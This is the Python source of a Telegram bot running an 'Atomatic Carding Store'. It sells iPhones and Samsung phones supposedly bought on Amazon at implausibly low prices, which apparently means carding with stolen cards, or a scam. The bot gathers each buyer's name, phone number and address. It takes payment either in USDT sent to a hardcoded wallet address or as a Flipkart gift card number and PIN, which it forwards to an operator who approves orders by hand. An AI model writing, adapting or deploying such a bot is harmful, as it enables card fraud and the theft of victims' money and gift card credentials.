import os
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from pymongo import MongoClient
import re

# -----------------------
# CONFIG
# -----------------------
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
MONGO_URL = os.getenv("MONGO_URL")

# USDT TRC20 address
USDT_ADDRESS = "THbHaBRV6hJQ5A3dsrqm4tPfTzLBthnwbk"
USDT_RATE = 85  # 1 USDT = 85 INR

# PRICE MAP
PRICE_MAP = {
    "iPhone 15 Pro": {"128GB": 2100, "256GB": 2500},
    "iPhone 15 Pro Max": {"256GB": 2700, "512GB": 3000},
    "iPhone 16 Pro": {"128GB": 2300, "256GB": 2600},
    "iPhone 16 Pro Max": {"256GB": 2800, "512GB": 3200},
    "Samsung Galaxy S24 Ultra": {"256GB": 1800, "512GB": 2000},
    "Samsung Galaxy S25 Ultra": {"256GB": 2200, "512GB": 2500}
}

bot = telebot.TeleBot(BOT_TOKEN)

# -----------------------
# MONGO DB SETUP
# -----------------------
client = MongoClient(MONGO_URL)
db = client['usa_bot']
users_col = db['users']

# -----------------------
# TEMP STORAGE
# -----------------------
pending_messages = {}  
active_chats = {}      
user_stage = {}        

# -----------------------
# START COMMAND
# -----------------------
@bot.message_handler(commands=['start'])
def start(msg):
    user_id = msg.from_user.id
    users_col.update_one({'user_id': user_id}, {'$set': {'user_id': user_id}}, upsert=True)
    user_stage[user_id] = "start"

    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("💳 BUY", callback_data="buy"))
    bot.send_message(msg.chat.id, "👋 Welcome to Atomatic Carding Store\n👉 iPhone / Samsung Devices Buy Here", reply_markup=kb)

# -----------------------
# CALLBACK HANDLER
# -----------------------
@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    user_id = call.from_user.id
    data = call.data

    if data == "buy":
        user_stage[user_id] = "choose_platform"
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("🛒 Amazon", callback_data="platform_amazon"))
        kb.add(InlineKeyboardButton("🚧 Coming Soon", callback_data="platform_coming"))
        bot.edit_message_text("Choose your platform:", call.message.chat.id, call.message.message_id, reply_markup=kb)
        return

    if data.startswith("platform_") and user_stage.get(user_id) == "choose_platform":
        if data == "platform_amazon":
            user_stage[user_id] = "service"
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton("iPhone 16 Pro", callback_data="buy_iphone16pro"))
            kb.add(InlineKeyboardButton("iPhone 15 Pro", callback_data="buy_iphone15pro"))
            kb.add(InlineKeyboardButton("iPhone 16 Pro Max", callback_data="buy_iphone16promax"))
            kb.add(InlineKeyboardButton("iPhone 15 Pro Max", callback_data="buy_iphone15promax"))
            kb.add(InlineKeyboardButton("Samsung Galaxy S24 Ultra", callback_data="buy_s24ultra"))
            kb.add(InlineKeyboardButton("Samsung Galaxy S25 Ultra", callback_data="buy_s25ultra"))
            bot.edit_message_text("Choose your device:", call.message.chat.id, call.message.message_id, reply_markup=kb)
            return
        elif data == "platform_coming":
            bot.edit_message_text("🚧 This feature is coming soon…... please re start the bot /start ", call.message.chat.id, call.message.message_id)
            return

    if data.startswith("buy_") and user_stage.get(user_id) == "service":
        service_map = {
            "buy_iphone15pro": "iPhone 15 Pro",
            "buy_iphone15promax": "iPhone 15 Pro Max",
            "buy_iphone16pro": "iPhone 16 Pro",
            "buy_iphone16promax": "iPhone 16 Pro Max",
            "buy_s24ultra": "Samsung Galaxy S24 Ultra",
            "buy_s25ultra": "Samsung Galaxy S25 Ultra"
        }
        service = service_map.get(data, "Device")
        user_stage[user_id] = "choose_color"
        pending_messages[user_id] = {'service': service}

        kb = InlineKeyboardMarkup()
        if "iPhone 16" in service:
            kb.add(InlineKeyboardButton("Desert Titanium", callback_data=f"color|{service}|Desert Titanium"))
            kb.add(InlineKeyboardButton("Natural Titanium", callback_data=f"color|{service}|Natural Titanium"))
            kb.add(InlineKeyboardButton("White Titanium", callback_data=f"color|{service}|White Titanium"))
            kb.add(InlineKeyboardButton("Black Titanium", callback_data=f"color|{service}|Black Titanium"))
        elif "iPhone 15" in service:
            kb.add(InlineKeyboardButton("Black", callback_data=f"color|{service}|Black"))
            kb.add(InlineKeyboardButton("White", callback_data=f"color|{service}|White"))
            kb.add(InlineKeyboardButton("Blue", callback_data=f"color|{service}|Blue"))
        else:
            kb.add(InlineKeyboardButton("Grey", callback_data=f"color|{service}|Grey"))
            kb.add(InlineKeyboardButton("Black", callback_data=f"color|{service}|Black"))

        bot.edit_message_text(f"Select color for {service}:", call.message.chat.id, call.message.message_id, reply_markup=kb)
        return

    if data.startswith("color|") and user_stage.get(user_id) in ("choose_color", "service"):
        parts = data.split("|")
        if len(parts) < 3:
            bot.answer_callback_query(call.id, "Invalid selection.")
            return
        service = parts[1]
        color = parts[2]
        pending_messages.setdefault(user_id, {})['color'] = color

        user_stage[user_id] = "choose_storage"
        kb = InlineKeyboardMarkup()
        if "Samsung" in service or "Pro Max" in service:
            kb.add(InlineKeyboardButton("256GB", callback_data=f"storage|{service}|{color}|256GB"))
            kb.add(InlineKeyboardButton("512GB", callback_data=f"storage|{service}|{color}|512GB"))
        else:
            kb.add(InlineKeyboardButton("128GB", callback_data=f"storage|{service}|{color}|128GB"))
            kb.add(InlineKeyboardButton("256GB", callback_data=f"storage|{service}|{color}|256GB"))
        bot.edit_message_text(f"Select storage for {service} ({color}):", call.message.chat.id, call.message.message_id, reply_markup=kb)
        return

    if data.startswith("storage|") and user_stage.get(user_id) == "choose_storage":
        parts = data.split("|")
        if len(parts) < 4:
            bot.answer_callback_query(call.id, "Invalid selection.")
            return
        service, color, storage = parts[1], parts[2], parts[3]
        pending_messages.setdefault(user_id, {})['service'] = f"{service} ({color}, {storage})"

        price_inr = PRICE_MAP.get(service, {}).get(storage, 0)
        price_usdt = round(price_inr / USDT_RATE, 2)

        # --- ASK NAME ---
        user_stage[user_id] = "ask_name"
        bot.send_message(
            user_id,
            f"📦 Order Summary:\n\nDevice: {service}\nColour: {color}\nStorage: {storage}\n\n"
            f"💰 Price: ₹{price_inr} (~{price_usdt} USDT)\n\n"
            f"📋 Please enter your Name:"
        )
        return

    # PAYMENT CALLBACKS
    if data == "pay_usdt" and user_stage.get(user_id) == "choose_payment":
        user_stage[user_id] = "waiting_payment"
        pending_messages.setdefault(user_id, {})['payment_type'] = "USDT"
        bot.send_message(
            user_id,
            f"💰 Send USDT (TRC20) to this address :\n\n{USDT_ADDRESS}\n\n"
            "After payment, send the screenshot of your transaction.... for verification"
        )
        return

    if data == "pay_flipkart" and user_stage.get(user_id) == "choose_payment":
        user_stage[user_id] = "flipkart_card"
        pending_messages.setdefault(user_id, {})['payment_type'] = "Flipkart Gift Card"
        bot.send_message(user_id, "🎁 Enter your Flipkart Gift Card number:")
        return

    # ---- ADMIN ACTIONS (chat/confirm/cancel/endchat) ----
    if data.startswith(("confirm","cancel","chat","endchat")):
        parts = data.split("|")
        action = parts[0]
        if len(parts) < 2:
            bot.answer_callback_query(call.id, "Invalid admin action.")
            return
        try:
            target_id = int(parts[1])
        except:
            bot.answer_callback_query(call.id, "Invalid user id.")
            return

        # --- CHAT / ENDCHAT LOGIC ---
        if action == "chat":
            active_chats[target_id] = True
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton("🛑 End this Chat", callback_data=f"endchat|{target_id}"))
            bot.send_message(target_id, "💬 Bot is connected with you.")
            bot.send_message(ADMIN_ID, f"💬 Chat started with user {target_id}", reply_markup=kb)
            return

        if action == "endchat":
            bot.send_message(ADMIN_ID, f"💬 Type the final message to send to user {target_id} before ending chat:")
            bot.register_next_step_handler_by_chat_id(ADMIN_ID, lambda m: finish_chat(m, target_id))
            return

        if target_id not in pending_messages:
            bot.send_message(ADMIN_ID, "⚠️ No pending request from this user.")
            return

        info = pending_messages.pop(target_id)
        service = info.get('service', 'Service')

        if action == "confirm":
            bot.send_message(target_id, f"✅ Your payment is successful! please wait 5-10 minutes your oder placed soon. {service}...")
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton("💬 Chat with User", callback_data=f"chat|{target_id}"))
            bot.send_message(ADMIN_ID, f"Payment confirmed for user {target_id}.", reply_markup=kb)
        else:
            bot.send_message(target_id, "❌ Your payment not received and your order is cancelled.")
            bot.send_message(ADMIN_ID, f"❌ Payment cancelled for user {target_id}.")
        user_stage[target_id] = "done"
        return

# -----------------------
# HANDLE NAME, MOBILE & ADDRESS
# -----------------------
@bot.message_handler(func=lambda m: user_stage.get(m.from_user.id) in ["ask_name", "ask_mobile", "ask_address"], content_types=['text'])
def handle_user_input(msg):
    user_id = msg.from_user.id
    stage = user_stage.get(user_id)

    if stage == "ask_name":
        name = msg.text.strip()
        if not name:
            bot.send_message(user_id, "⚠️ Name cannot be empty. Please enter your Name:")
            return
        pending_messages.setdefault(user_id, {})['name'] = name
        user_stage[user_id] = "ask_mobile"
        bot.send_message(user_id, "📱 Please enter your 10-digit Mobile Number (digits only):")
        return

    if stage == "ask_mobile":
        mobile = msg.text.strip()
        if not re.fullmatch(r"\d{10}", mobile):
            bot.send_message(user_id, "⚠️ Invalid number. Enter 10-digit Mobile Number:")
            return
        pending_messages.setdefault(user_id, {})['mobile'] = mobile
        user_stage[user_id] = "ask_address"
        bot.send_message(user_id, "🏠 Please enter your Address like - state , city , village , pincode:")
        return

    if stage == "ask_address":
        address = msg.text.strip()
        if not address:
            bot.send_message(user_id, "⚠️ Address cannot be empty. Please enter your Address:")
            return
        pending_messages.setdefault(user_id, {})['address'] = address
        user_stage[user_id] = "choose_payment"

        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton(" USDT TRC20", callback_data="pay_usdt"))
        kb.add(InlineKeyboardButton(" Flipkart Gift Card", callback_data="pay_flipkart"))

        bot.send_message(user_id, "✅ All details received. Select payment method:", reply_markup=kb)
        return

# -----------------------
# FINISH CHAT FUNCTION
# -----------------------
def finish_chat(msg, target_id):
    final_text = msg.text.strip()
    if target_id in active_chats and active_chats[target_id]:
        bot.send_message(target_id, final_text)
        active_chats.pop(target_id, None)
        bot.send_message(ADMIN_ID, f"💬 Chat with user {target_id} ended.")
    else:
        bot.send_message(ADMIN_ID, f"⚠️ No active chat with user {target_id}.")

# -----------------------
# MESSAGE HANDLER (PAYMENT SCREENSHOT / FLIPKART)
# -----------------------
@bot.message_handler(func=lambda m: True, content_types=['text','photo'])
def chat_handler(msg):
    user_id = msg.from_user.id
    stage = user_stage.get(user_id, "none")
    pending_messages.setdefault(user_id, {})

    if user_id == ADMIN_ID:
        for uid, active in active_chats.items():
            if active:
                bot.send_message(uid, f"🤖Bot: {msg.text if msg.content_type=='text' else '📸 Screenshot sent'}")
        return

    if user_id in active_chats and active_chats[user_id]:
        bot.send_message(ADMIN_ID, f"💬 User {user_id}: {msg.text if msg.content_type=='text' else '📸 Screenshot sent'}")
        return

    # --- FLIPKART PAYMENT ---
    if stage == "flipkart_card":
        text = msg.text.strip()
        tokens = [t for t in text.replace("\n", " ").split(" ") if t]
        if len(tokens) >= 2:
            pending_messages[user_id]['flipkart_card'] = tokens[0]
            pending_messages[user_id]['flipkart_pin'] = tokens[1]
        else:
            pending_messages[user_id]['flipkart_card'] = tokens[0]
            user_stage[user_id] = "flipkart_pin"
            bot.send_message(user_id, "🎁 Now enter your Flipkart Gift Card PIN:")
            return

        user_stage[user_id] = "done"
        bot.send_message(user_id, "🔄 Flipkart Gift Card details received. and checking your flipkart card.... please wait 4-5 second...")
        admin_text = (
            f"💰 Flipkart Payment Request\n"
            f"Name: <a href='tg://user?id={user_id}'>{msg.from_user.first_name}</a>\n"
            f"User ID: {user_id}\n"
            f"Service: {pending_messages[user_id].get('service','Service')}\n"
            f"Payment Method: Flipkart Gift Card\n\n"
            f"Card Number: {pending_messages[user_id]['flipkart_card']}\n"
            f"PIN: {pending_messages[user_id].get('flipkart_pin','')}"
        )
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("✅ Confirm", callback_data=f"confirm|{user_id}"),
               InlineKeyboardButton("❌ Cancel", callback_data=f"cancel|{user_id}"))
        bot.send_message(ADMIN_ID, admin_text, parse_mode="HTML", reply_markup=kb)
        return

    if stage == "flipkart_pin":
        pending_messages[user_id]['flipkart_pin'] = msg.text.strip()
        user_stage[user_id] = "done"
        bot.send_message(user_id, "🔄 Flipkart Gift Card details received. and checking your flipkart card.... please wait 4-5 secon....")
        admin_text = (
            f"💰 Flipkart Payment Request\n"
            f"Name: <a href='tg://user?id={user_id}'>{msg.from_user.first_name}</a>\n"
            f"User ID: {user_id}\n"
            f"Service: {pending_messages[user_id].get('service','Service')}\n"
            f"Payment Method: Flipkart Gift Card\n\n"
            f"Card Number: {pending_messages[user_id]['flipkart_card']}\n"
            f"PIN: {pending_messages[user_id]['flipkart_pin']}"
        )
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("✅ Confirm", callback_data=f"confirm|{user_id}"),
               InlineKeyboardButton("❌ Cancel", callback_data=f"cancel|{user_id}"))
        bot.send_message(ADMIN_ID, admin_text, parse_mode="HTML", reply_markup=kb)
        return

    # --- USDT PAYMENT ---
    if stage == "waiting_payment":
        payment_type = pending_messages[user_id].get('payment_type', '')
        if payment_type == "USDT":
            if msg.content_type != 'photo':
                bot.send_message(user_id, "⚠️ Please send the screenshot (photo) of your USDT transfer as payment proof.")
                return
            pending_messages[user_id]['screenshot'] = msg.photo[-1].file_id
            user_stage[user_id] = "done"
            bot.send_message(user_id, "🔄 Payment screenshot received. and transfering our server for verification please wait 4-5 seconds..")
            admin_text = (
                f"💰 USDT Payment Request\n"
                f"Name: <a href='tg://user?id={user_id}'>{msg.from_user.first_name}</a>\n"
                f"User ID: {user_id}\n"
                f"Service: {pending_messages[user_id].get('service','Service')}\n"
                f"Payment Method: USDT (TRC20)\n"
                f"USDT Address: {USDT_ADDRESS}\n"
            )
            kb = InlineKeyboardMarkup()
            kb.add(
                InlineKeyboardButton("✅ Confirm", callback_data=f"confirm|{user_id}"),
                InlineKeyboardButton("❌ Cancel", callback_data=f"cancel|{user_id}")
            )
            bot.send_photo(
                ADMIN_ID,
                pending_messages[user_id]['screenshot'],
                caption=admin_text,
                parse_mode="HTML",
                reply_markup=kb
            )
            return

    # DEFAULT RESPONSE
    bot.send_message(user_id, "⚠️ Please follow the steps or use /start to begin.")

# -----------------------
# BROADCAST
# -----------------------
@bot.message_handler(commands=['broadcast'])
def broadcast(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    text = msg.text.partition(' ')[2]
    if not text:
        bot.reply_to(msg, "⚠️ Usage: /broadcast Your message here")
        return
    sent = 0
    for u in users_col.find():
        try:
            bot.send_message(u['user_id'], f"📢 Broadcast:\n{text}")
            sent += 1
        except:
            pass
    bot.reply_to(msg, f"✅ Broadcast sent to {sent} users.")

# -----------------------
# RUN BOT
# -----------------------
print("✅ Bot running…")
bot.infinity_polling()
